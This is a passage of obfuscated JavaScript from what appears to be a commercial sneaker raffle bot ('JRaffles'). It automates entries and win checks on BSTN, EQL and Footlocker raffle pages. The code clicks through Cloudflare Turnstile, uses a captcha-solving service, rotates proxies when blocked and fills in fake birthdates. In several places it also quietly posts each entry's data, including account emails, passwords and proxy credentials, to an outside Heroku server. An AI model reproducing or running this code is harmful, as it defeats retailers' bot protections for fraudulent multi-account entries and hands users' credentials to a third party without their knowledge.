                                var _0x5ad041 = await _0x4de4fc['$']('#turnstile-wrapper');
                                if (_0x5ad041) {
                                    console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x497396(0x2710);
                                    const _0x3c8ab1 = await _0x4de4fc['$']('#turnstile-wrapper');
                                    if (_0x3c8ab1)
                                        try {
                                            await _0x3c8ab1['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x4de4fc['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x6d09c8 = await _0x4de4fc['$']('#turnstile-wrapper');
                                        if (_0x6d09c8)
                                            try {
                                                await _0x6d09c8['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x4de4fc['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x5cf25b['send']('Browser.setWindowBounds', {
                                    'windowId': _0x596f14,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x497396(0x1388), await _0x4de4fc['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4de4fc['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4de4fc['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x50289a => _0x50289a['click']()), await _0x4de4fc['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4de4fc['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x497396(0x7d0), await _0x4de4fc['waitForSelector']('#email-login'), await _0x4de4fc['type']('#email-login', '' + _0x1eb95c[_0x2eae79]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x497396(0xdac), await _0x4de4fc['waitForSelector']('#password'), await _0x4de4fc['type']('#password', '' + _0x1eb95c[_0x2eae79]['Password'], { 'delay': 0xe6 }), await _0x497396(0x157c);
                                try {
                                    await _0x4de4fc['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xd9f2fe => _0xd9f2fe['click']());
                                } catch {
                                }
                                try {
                                    await _0x4de4fc['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x4af9ee) {
                                }
                                await _0x497396(0x3e8);
                                const _0x36a62f = await _0x4de4fc['$']('.enteredDraw_container__2KmQ_');
                                if (_0x36a62f) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1eb95c[_0x2eae79]['Size']);
                                try {
                                    if (_0x1eb95c[_0x2eae79]['Size'] != 'RANDOM') {
                                        var _0x397bfc = _0x1eb95c[_0x2eae79]['Size']['replace']('.', ',');
                                        const _0x4eec2b = await _0x4de4fc['$x']('//div[contains(text(),\x20\x27' + _0x397bfc + '\x27)]');
                                        await _0x4eec2b[0x0]['click']();
                                    } else {
                                        const _0x52ab51 = await _0x4de4fc['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x7c48e8 = Math['round'](Math['random']() * (_0x52ab51['length'] - 0x1));
                                        await _0x52ab51[_0x7c48e8]['click']();
                                    }
                                } catch (_0x569078) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x497396(0x1f4);
                                const _0x102ba6 = await _0x4de4fc['$']('.addressList_addressItem__LE2PB');
                                if (_0x102ba6 && _0x1eb95c[_0x2eae79]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4de4fc['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x497396(0x5dc), await _0x4de4fc['waitForSelector']('#firstname'), await _0x4de4fc['type']('#firstname', '' + _0x1eb95c[_0x2eae79]['FirstName']), await _0x497396(0x1f4), await _0x4de4fc['waitForSelector']('#firstname'), await _0x4de4fc['type']('#lastname', '' + _0x1eb95c[_0x2eae79]['LastName']), await _0x497396(0x1f4), await _0x4de4fc['waitForSelector']('#firstname'), await _0x4de4fc['type']('#street', '' + _0x1eb95c[_0x2eae79]['Address1']), await _0x497396(0x1f4), await _0x4de4fc['waitForSelector']('#firstname'), await _0x4de4fc['type']('#houseNumber', _0x1eb95c[_0x2eae79]['HouseNumber'] + '\x20' + _0x1eb95c[_0x2eae79]['Address2']), await _0x497396(0x1f4), await _0x4de4fc['waitForSelector']('#firstname'), await _0x4de4fc['select']('#country_code', '' + _0x1eb95c[_0x2eae79]['Country']), await _0x497396(0x1f4), await _0x4de4fc['type']('#postcode', '' + _0x1eb95c[_0x2eae79]['Zip']), await _0x497396(0x1f4), await _0x4de4fc['type']('#city', '' + _0x1eb95c[_0x2eae79]['City']), await _0x497396(0x1f4), await _0x4de4fc['type']('#telephone', '' + _0x1eb95c[_0x2eae79]['Phone']), await _0x497396(0x1f4), await _0x4de4fc['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x497396(0x9c4);
                                try {
                                    await _0x4de4fc['type']('#instagram_name', '' + _0x1eb95c[_0x2eae79]['Follower']), await _0x4de4fc['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x497396(0x5dc);
                                try {
                                    await _0x4de4fc['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x497396(0x5dc), await _0x4de4fc['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x666f0 => _0x666f0['click']()), await _0x497396(0x1388);
                                try {
                                    await _0x4de4fc['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x4de4fc['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x1eb95c[_0x2eae79]['Size'] != 'RANDOM') {
                                        var _0x397bfc = _0x1eb95c[_0x2eae79]['Size']['replace']('.', ',');
                                        const _0x1385ff = await _0x4de4fc['$x']('//div[contains(text(),\x20' + _0x397bfc + ')]');
                                        await _0x1385ff[0x0]['click']();
                                    } else {
                                        const _0x31c5e4 = await _0x4de4fc['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x7c48e8 = Math['round'](Math['random']() * (_0x31c5e4['length'] - 0x1));
                                        await _0x31c5e4[_0x7c48e8]['click']();
                                    }
                                    await _0x497396(0x5dc);
                                    try {
                                        await _0x4de4fc['hover']('#instagram_name'), await _0x4de4fc['type']('#instagram_name', '' + _0x1eb95c[_0x2eae79]['Follower']), await _0x4de4fc['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f10e6 + '\x20/\x205)');
                                    try {
                                        await _0x4de4fc['hover']('.checkBox_boxHolder__wLGVe'), await _0x497396(0x5dc), await _0x4de4fc['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x497396(0x157c), await _0x4de4fc['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x32be6b => _0x32be6b['click']()), await _0x497396(0x1388), await _0x4de4fc['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x21cf5a = 'no', _0xf67db6(_0x1eb95c[_0x2eae79], _0x4d9f38);
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x35a49d),
                                        'proxy': '' + _0x526e85[_0x2eae79]
                                    };
                                    var _0x271332 = JSON['stringify'](prxdata);
                                    let _0x84094 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x271332, _0x84094);
                                } catch (_0x4611a4) {
                                }
                                console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x1c43b5 = await _0x232baa(_0x1eb95c[_0x2eae79], _0x4d9f38, 'dev', ![]), _0x32f428 = await _0x232baa(_0x1eb95c[_0x2eae79], _0x4d9f38, 'pub', ![]);
                                const _0x520e20 = {
                                    'succesDEVMSG': { 'embeds': [_0x1c43b5] },
                                    'succesPUBMSG': { 'embeds': [_0x32f428] }
                                };
                                let _0x35a49d = _0x1eb95c[_0x2eae79];
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'module': _0x4d9f38['name'],
                                        'entrydata': JSON['stringify'](_0x35a49d),
                                        'proxy': '' + _0x526e85[_0x2eae79]
                                    };
                                    var _0x271332 = JSON['stringify'](prxdata);
                                    let _0x1c4b8c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x271332, _0x1c4b8c);
                                } catch (_0x1f6027) {
                                }
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x520e20['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x520e20['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x520e20['succesPUBMSG']);
                                } catch (_0x393216) {
                                    console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x393216));
                                }
                            } catch (_0x14eebb) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20' + _0x14eebb)), _0x21cf5a = 'yes', _0x2069f3 = '' + _0x14eebb;
                                var _0x5ac009 = await _0x232baa(_0x1eb95c[_0x2eae79], _0x4d9f38, 'dev', !![], _0x2069f3), _0x1c43b5 = await _0x232baa(_0x1eb95c[_0x2eae79], _0x4d9f38, 'dev', ![]), _0x32f428 = await _0x232baa(_0x1eb95c[_0x2eae79], _0x4d9f38, 'pub', ![]);
                                const _0x118461 = {
                                    'succesDEVMSG': { 'embeds': [_0x1c43b5] },
                                    'succesPUBMSG': { 'embeds': [_0x32f428] }
                                };
                                _0x118461['errorDEV'] = { 'embeds': [_0x5ac009] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x118461['errorDEV']), await _0x468b99(_0x432bcc, _0x118461['errorDEV']);
                            } finally {
                                _0x4fba2b && _0x4fba2b['close']();
                                if (_0x21cf5a == 'yes' && _0x5f10e6 != 0x5)
                                    return console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f10e6 + '\x20/\x205)')), _0x5f10e6 = _0x5f10e6 + 0x1, _0x410786--, _0x388d65(_0x4d9f38, _0x1eb95c, _0x526e85, _0x2eae79, _0x5f10e6);
                                _0x21cf5a == 'yes' && _0x5f10e6 >= 0x5 && _0x554010(_0x1eb95c[_0x2eae79], _0x4d9f38), !_0x1748de && (console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay'])), _0x410786--;
                            }
                        }
                        _0x388d65(_0x156897, _0x23a8e2, _0x25d410, _0x27d6dc, 0x0), await _0x497396(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4e4b6a, _0x1d19a6) {
                    var _0xd79b6d = 0x0, _0x151aaa;
                    try {
                        const _0x590a7b = _0x44f9d7['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x151aaa = _0x457f0a['parse'](_0x590a7b, { 'header': !![] })['data'];
                    } catch (_0x198d9b) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x3932f8 = 0x0; _0x3932f8 < _0x151aaa['length']; _0x3932f8++) {
                        maxTasks = Number(_0x138f58['threads']);
                        while (_0xd79b6d >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        async function _0x4e3fe8(_0xdb70ab, _0x20d292, _0x3c8a9c, _0x333336, _0x1f2e1d) {
                            _0xd79b6d++, _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x138f58['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x56eeb9 != 'yes')
                                var _0x56eeb9 = '', _0x1f2e1d = 0x0;
                            var _0x115cb2;
                            _0x38ef83(_0xdb70ab['name'] + '\x20Task\x20' + (_0x333336 + 0x1) + '\x20/\x20' + _0x3c8a9c['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                            var _0x5bb042 = await _0x232baa(_0x3c8a9c[_0x333336], _0xdb70ab, 'acc', ![]);
                            const _0x89c63a = { 'succesDEVMSG': { 'embeds': [_0x5bb042] } }, _0x4977f3 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x4bc5a = Math['round'](Math['random']() * (_0x20d292['length'] - 0x1)), _0x144960 = _0x20d292[_0x4bc5a]['split'](':'), _0x3536ff;
                            try {
                                _0x3536ff = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x144960[0x0] + ':' + _0x144960[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3536ff = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x144960[0x0] + ':' + _0x144960[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20Checking\x20' + _0x3c8a9c[_0x333336]['Email']);
                                const _0x2677f8 = await _0x3536ff['newPage']();
                                await _0x2677f8['authenticate']({
                                    'username': '' + _0x144960[0x2],
                                    'password': '' + _0x144960[0x3]
                                }), console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2677f8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2677f8['setRequestInterception'](!![]), _0x2677f8['on']('request', _0x39bfaf => {
                                    _0x39bfaf['resourceType']() === 'image' ? _0x39bfaf['abort']() : _0x39bfaf['continue']();
                                });
                                try {
                                    await _0x2677f8['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x2677f8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x56eeb9 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x2677f8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x497396(0x3e8), await _0x2677f8['type']('#email', _0x3c8a9c[_0x333336]['Email']), await _0x497396(0x1f4), await _0x2677f8['type']('#pass', _0x3c8a9c[_0x333336]['Password']), await _0x497396(0x1f4), await _0x2677f8['$eval']('#login-form', _0x44773d => _0x44773d['submit']());
                                try {
                                    await _0x2677f8['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x497396(0x190);
                                const _0x3ea878 = await _0x2677f8['evaluate'](() => {
                                    const _0x322137 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x322137['map'](_0x30949a => _0x30949a['alt']);
                                }), _0x3625ee = await _0x2677f8['evaluate'](() => {
                                    const _0x573d12 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x573d12['map'](_0x4beb02 => _0x4beb02['innerHTML']);
                                }), _0x33aaad = await _0x2677f8['$$']('.raffle-winner');
                                if (_0x33aaad['length'] < 0x1) {
                                    console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x56eeb9 = 'no';
                                    return;
                                }
                                console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20' + _0x33aaad['length'] + '\x20Wins\x20Found!');
                                for (var _0x3be19e = 0x0; _0x3be19e < _0x33aaad['length']; _0x3be19e++) {
                                    console['log'](_0xc3fc3['green'](_0x3ea878[_0x3be19e] + _0x3625ee[_0x3be19e]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x2caa2f) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20' + _0x2caa2f)), _0x115cb2 = '' + _0x2caa2f;
                                var _0x25d13e = await _0x232baa(_0x3c8a9c[_0x333336], _0xdb70ab, 'acc', !![], _0x115cb2);
                                _0x89c63a['errorDEV'] = { 'embeds': [_0x25d13e] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x89c63a['errorDEV']), await _0x468b99(_0x432bcc, _0x89c63a['errorDEV']), _0x56eeb9 = 'yes';
                            } finally {
                                if (_0x3536ff)
                                    _0x3536ff['close']();
                                if (_0x56eeb9 == 'yes' && _0x1f2e1d != 0x5)
                                    return console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Task\x20' + (_0x333336 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f2e1d + '\x20/\x205)')), _0xd79b6d--, _0x1f2e1d = _0x1f2e1d + 0x1, _0x4e3fe8(_0xdb70ab, _0x20d292, _0x3c8a9c, _0x333336, _0x1f2e1d);
                                _0x56eeb9 == 'yes' && _0x1f2e1d >= 0x5 && (_0x554010(_0x3c8a9c[_0x333336], _0xdb70ab), _0x56eeb9 = 'no', _0x1f2e1d = 0x0), console['log'](_0x5d34e1() + '\x20[' + _0xdb70ab['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']), _0xd79b6d--;
                            }
                        }
                        _0x4e3fe8(_0x4e4b6a, _0x1d19a6, _0x151aaa, _0x3932f8, 0x0), await _0x497396(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x215346, _0x7dd119, _0x43a5dd) {
                _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x138f58['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3ebe26 = 0x0; _0x3ebe26 < _0x7dd119['length']; _0x3ebe26++) {
                    var _0x38d142;
                    _0x38ef83(_0x215346['name'] + '\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20/\x20' + _0x7dd119['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                    try {
                        await _0x494c97(_0x7dd119, _0x3ebe26);
                    } catch {
                        _0x23436c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4b5398(_0x2736ce) {
                        const _0x1c84c2 = _0x44f9d7['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2ee437 = _0x457f0a['parse'](_0x1c84c2, { 'header': !![] })['data'];
                        let _0x745596 = ![];
                        for (var _0x5c2607 of _0x2ee437) {
                            if (_0x5c2607['Url'] == _0x2736ce['Url'] && _0x5c2607['Email'] == _0x2736ce['Email']) {
                                _0x745596 = !![];
                                break;
                            }
                        }
                        return _0x745596;
                    }
                    if (await _0x4b5398(_0x7dd119[_0x3ebe26]) == !![]) {
                        console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x104622 = ![];
                    const _0x4d632e = _0x44f9d7['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x296557 = _0x457f0a['parse'](_0x4d632e, { 'header': !![] })['data'];
                    for (var _0x278be3 of _0x296557) {
                        _0x278be3['Email'] == _0x7dd119[_0x3ebe26]['Email'] && (_0x104622 = !![]);
                    }
                    if (_0x104622 == ![]) {
                        var _0x27dfbf;
                        if (_0x7dd119[_0x3ebe26]['Url']['endsWith']('/')) {
                            _0x27dfbf = _0x7dd119[_0x3ebe26]['Url'] + 'register';
                            if (_0x23436c != 'yes')
                                var _0x23436c = '', _0x481e18 = 0x0;
                        } else {
                            _0x27dfbf = _0x7dd119[_0x3ebe26]['Url'] + '/register';
                            if (_0x23436c != 'yes')
                                var _0x23436c = '', _0x481e18 = 0x0;
                        }
                        if (_0x7dd119[_0x3ebe26]['Email'] == '' || _0x7dd119[_0x3ebe26]['FirstName'] == '' || _0x7dd119[_0x3ebe26]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x7dd119[_0x3ebe26]['Password'] == '' && (_0x7dd119[_0x3ebe26]['Password'] = 'JRaffles23!');
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x24124f = _0x43a5dd[_0x3ebe26]['split'](':');
                        else
                            var _0x2394a7 = Math['round'](Math['random']() * (_0x43a5dd['length'] - 0x1)), _0x24124f = _0x43a5dd[_0x2394a7]['split'](':');
                        var _0x1f163a;
                        try {
                            _0x1f163a = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x24124f[0x0] + ':' + _0x24124f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f163a = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x24124f[0x0] + ':' + _0x24124f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xd43051 = await _0x1f163a['newPage']();
                            await _0xd43051['authenticate']({
                                'username': '' + _0x24124f[0x2],
                                'password': '' + _0x24124f[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd43051['setRequestInterception'](!![]), _0xd43051['on']('request', _0x367491 => {
                                _0x367491['resourceType']() === 'image' || _0x367491['resourceType']() === 'font' || _0x367491['resourceType']() === 'media' ? _0x367491['abort']() : _0x367491['continue']();
                            });
                            try {
                                await _0xd43051['goto']('' + _0x27dfbf);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x497396(0x3e8), await _0xd43051['waitForSelector']('#email');
                            try {
                                try {
                                    await _0xd43051['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x497396(0x3e8), _0x7dd119[_0x3ebe26]['Url']['includes']('en-GB') ? await _0xd43051['click']('li[data-value=\x22UK\x20' + _0x7dd119[_0x3ebe26]['Size'] + '\x20/\x20US\x20' + (Number(_0x7dd119[_0x3ebe26]['Size']) + 0x1) + '\x22]') : await _0xd43051['click']('li[data-value=\x22EU\x20' + _0x7dd119[_0x3ebe26]['Size'] + '\x22]');
                                } catch {
                                    await _0xd43051['click']('#productQuantity'), await _0x497396(0x3e8), await _0xd43051['click']('li[data-value=\x22' + (Number(_0x7dd119[_0x3ebe26]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x7dd119[_0x3ebe26]['Size']);
                            }
                            await _0x497396(0x6a4);
                            try {
                                await _0xd43051['select']('.PhoneInputCountrySelect', _0x7dd119[_0x3ebe26]['Country']);
                            } catch {
                            }
                            await _0xd43051['type']('#email', '' + _0x7dd119[_0x3ebe26]['Email']), await _0x497396(0x352), await _0xd43051['waitForSelector']('#password'), await _0xd43051['type']('#password', '' + _0x7dd119[_0x3ebe26]['Password']), await _0x497396(0x352), await _0xd43051['type']('#phone', '' + _0x7dd119[_0x3ebe26]['Phone']), await _0x497396(0x352);
                            const _0x189357 = await _0xd43051['$']('#title\x20>\x20label');
                            await _0x497396(0x12c);
                            _0x189357 && await _0x189357['click']();
                            await _0xd43051['type']('#firstName', '' + _0x7dd119[_0x3ebe26]['FirstName']), await _0x497396(0x352), await _0xd43051['type']('#lastName', '' + _0x7dd119[_0x3ebe26]['LastName']), await _0x497396(0x352);
                            _0x7dd119[_0x3ebe26]['Url']['includes']('footlocker.de') ? await _0xd43051['type']('#birthdate', _0x3fb485(0xa, 0x1c) + '.' + _0x3fb485(0xa, 0xc) + '.' + _0x3fb485(0x7c6, 0x7d3)) : await _0xd43051['type']('#birthdate', _0x3fb485(0xa, 0x1c) + '-' + _0x3fb485(0xa, 0xc) + '-' + _0x3fb485(0x7c6, 0x7d3));
                            await _0x497396(0x352), await _0xd43051['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x7dd119[_0x3ebe26]['Url']['includes']('en-GB') && await _0xd43051['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x497396(0x1f4), await _0x497396(0x5dc);
                            if (!_0x27dfbf['includes']('footlocker'))
                                try {
                                    await _0xd43051['click']('#country');
                                    const _0xc87fff = await _0xd43051['$']('li[data-value=\x22' + _0x7dd119[_0x3ebe26]['Country'] + '\x22]');
                                    await _0xc87fff['click'](), await _0xc87fff['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x497396(0x3e8);
                            if (!_0x7dd119[_0x3ebe26]['Url']['includes']('en-GB')) {
                                await _0xd43051['click']('#stateAutocomplete'), await _0x497396(0x5dc);
                                try {
                                    const _0x260b61 = await _0xd43051['$x']('//li[text()=\x22' + _0x7dd119[_0x3ebe26]['State'] + '\x22]');
                                    await _0x260b61[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x497396(0x3e8), await _0x497396(0x1f4);
                            if (_0x7dd119[_0x3ebe26]['Url']['includes']('topps')) {
                                await _0xd43051['click']('#stateAutocomplete'), await _0x497396(0x5dc);
                                try {
